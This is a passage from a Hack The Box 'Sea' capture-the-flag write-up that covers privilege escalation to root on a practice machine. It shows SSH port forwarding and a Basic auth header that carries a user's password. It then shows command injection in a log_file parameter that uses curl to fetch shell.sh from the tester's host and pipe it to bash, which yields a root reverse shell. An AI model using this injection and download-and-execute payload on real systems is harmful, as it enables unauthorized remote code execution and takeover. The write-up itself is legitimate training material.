+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">amay@sea:~$ netstat -anot</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:51151         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:56026         TIME_WAIT   timewait (25.42/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:43684         TIME_WAIT   timewait (34.45/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:43670         TIME_WAIT   timewait (31.44/0/0)</span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s forward that port to our local machine and check what it has for us:<br><code>ssh amay@sea.htb -L 8080:localhost:8080</code></p>
+<p>And we are prompted to enter a username and a password:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sea/web3.png"
+                      alt="Privesc"
+                ><figcaption>Privesc</figcaption></figure></p>
+<p>So let’s login to it using <code>amay</code>‘s creds.</p>
+<p>And it looks like some sort of internal monitoring service:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sea/web4.png"
+                      alt="Privesc"
+                ><figcaption>Privesc</figcaption></figure></p>
+<p>One of the features is that we can check the access.log file, let’s check the web request being made and understand what’s actually going on under the hood:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>57</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-mel">log_file=%2Fvar%2Flog%2Fapache2%2Faccess.<span class="keyword">log</span>&amp;analyze_log=</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that the filename is being passed into a <code>log_file</code> parameter. Maybe we can tamper it to achieve RCE?<br>Let’s try to make a request to our local server using it:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>57</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-abnf">log_file<span class="operator">=</span><span class="operator">=</span><span class="comment">;curl+10.10.x.x&amp;analyze_log=</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we get a callback:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">77.74</span> - - [<span class="number">20</span>/<span class="type">Dec</span>/<span class="number">2024</span> <span class="number">09</span>:<span class="number">07</span>:<span class="number">51</span>] <span class="string">&quot;GET / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>So let’s get that reverse shell ;)</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>42</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-abnf">log_file<span class="operator">=</span><span class="operator">=</span><span class="comment">;curl+10.10.x.x/shell.sh|bash&amp;analyze_log=</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>And here’s our root flag:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.77.74</span>] <span class="number">35876</span></span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">cat /root/root.txt</span></span><br><span class="line"><span class="string"># 1713afca5f7346******************</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for sea! Hope you enjoyed it.<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Sea</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-12-20 07:48:46</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-20 09:14:04
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/12/20/Hackthebox-Sea/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/13/Hackthebox-Compiled/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Compiled</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Sea</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-10-129-77-74"><span class="nav-text">Web Application - http:&#x2F;&#x2F;10.129.77.74 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root"><span class="nav-text">Privilege Escalation to root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
